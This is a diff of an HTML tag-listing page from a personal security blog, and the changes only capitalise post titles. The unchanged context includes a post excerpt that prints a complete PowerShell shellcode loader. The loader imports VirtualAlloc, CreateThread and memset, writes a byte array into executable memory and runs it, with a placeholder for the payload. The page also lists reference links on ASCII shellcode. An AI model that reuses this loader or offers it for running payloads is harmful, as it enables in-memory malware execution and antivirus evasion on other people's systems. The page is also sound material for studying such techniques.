@@ -71,7 +71,7 @@
 </header>
 <article class="post-entry tag-entry">
 <header class=entry-header>
-<h2>ascii shellcode
+<h2>Ascii shellcode
 </h2>
 </header>
 <section class=entry-content>
@@ -83,11 +83,11 @@ References
 http://inaz2.hatenablog.com/entry/2014/07/11/004655 http://inaz2.hatenablog.com/entry/2014/07/12/000007 http://inaz2.hatenablog.com/entry/2014/07/13/025626 https://code.google.com/archive/p/alpha3/ https://nets.ec/Ascii_shellcode </p>
 </section>
 <footer class=entry-footer><span title="2016-02-09 00:00:00 +0800 CST">February 9, 2016</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Zet</footer>
-<a class=entry-link aria-label="post link to ascii shellcode" href=https://blog.zet.tw/posts/2016-02-09-ascii-shellcode/></a>
+<a class=entry-link aria-label="post link to Ascii shellcode" href=https://blog.zet.tw/posts/2016-02-09-ascii-shellcode/></a>
 </article>
 <article class="post-entry tag-entry">
 <header class=entry-header>
-<h2>use powershell lunch shellcode
+<h2>Use powershell lunch shellcode
 </h2>
 </header>
 <section class=entry-content>
@@ -95,7 +95,7 @@ http://inaz2.hatenablog.com/entry/2014/07/11/004655 http://inaz2.hatenablog.com/
 $code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = SHELLCOD;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 }; SHELLCOD的地方是要替換的...</p>
 </section>
 <footer class=entry-footer><span title="2013-03-18 00:00:00 +0800 CST">March 18, 2013</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Zet</footer>
-<a class=entry-link aria-label="post link to use powershell lunch shellcode" href=https://blog.zet.tw/posts/2013-03-18-pwershell-lunch-shellcode/></a>
+<a class=entry-link aria-label="post link to Use powershell lunch shellcode" href=https://blog.zet.tw/posts/2013-03-18-pwershell-lunch-shellcode/></a>
 </article>
 </main>
 <footer class=footer>
